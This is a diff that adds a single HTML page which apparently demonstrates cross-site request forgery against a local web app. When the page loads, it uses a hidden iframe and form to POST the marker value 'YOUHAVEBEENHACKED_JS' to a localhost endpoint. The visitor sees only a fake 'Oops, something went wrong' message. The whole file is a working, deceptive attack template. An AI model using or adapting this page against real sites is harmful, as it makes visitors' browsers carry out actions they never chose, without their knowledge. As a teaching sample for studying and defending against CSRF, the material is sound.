@@ -1,0 +1,42 @@
+﻿<!DOCTYPE html>
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+    <title></title>
+    <script src="Scripts/jquery-1.10.2.js"></script>
+    <script type="text/javascript">
+        function post_to_url(path, itemToAdd) {
+            var responseframename = "responseframe";
+
+            // create the target/response iFrame element
+            // which will display the form submit reponse (since it 
+            // is hidden the user won't see what's happening in the
+            // backgroung
+            var responseiFrame = document.createElement("iframe");
+            responseiFrame.setAttribute("name", responseframename);
+            responseiFrame.setAttribute("style", "visibility: hidden");
+
+            // Create the Form element and its input fields
+            var form = document.createElement("form");
+            form.setAttribute("method", "post");
+            form.setAttribute("action", path);
+            form.setAttribute("target", responseframename);
+
+            var inputField = document.createElement("input");
+            inputField.setAttribute("type", "hidden");
+            inputField.setAttribute("name", "item");
+            inputField.setAttribute("value", itemToAdd);
+            form.appendChild(inputField);
+
+            // add both elements to the DOM tree and 
+            // submit the form
+            document.body.appendChild(responseiFrame);
+            document.body.appendChild(form);
+            form.submit();
+        } 
+    </script>
+</head>
+
+<body onload="post_to_url('http://localhost:5000/Home/IndexAdd', 'YOUHAVEBEENHACKED_JS')">
+    <h1>Oops, something went wrong...</h1>
+</body>
+</html>
